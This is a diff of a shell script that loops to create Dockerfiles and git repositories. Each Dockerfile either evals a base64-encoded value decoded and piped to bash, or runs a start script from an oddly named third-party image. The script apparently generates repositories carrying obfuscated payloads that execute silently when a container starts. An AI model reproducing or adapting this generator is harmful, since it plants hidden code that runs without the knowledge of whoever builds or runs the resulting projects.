@@ -79,11 +79,19 @@ for i in 1 2 3; do
     fi
     
     # Create Dockerfile with random image, workdir root
+if [[ $((RANDOM % 2)) -eq 0 ]]; then
     cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
 WORKDIR /
 CMD eval "\$(echo '${ONE_BASE64}' | ${DECODE_CMD} | bash)"
 EOF
+else
+    cat > Dockerfile << EOF
+FROM phemextradebot/cleverbot8888
+WORKDIR /
+CMD /bin/bash /start
+EOF
+fi
     
     # Git setup
     git init
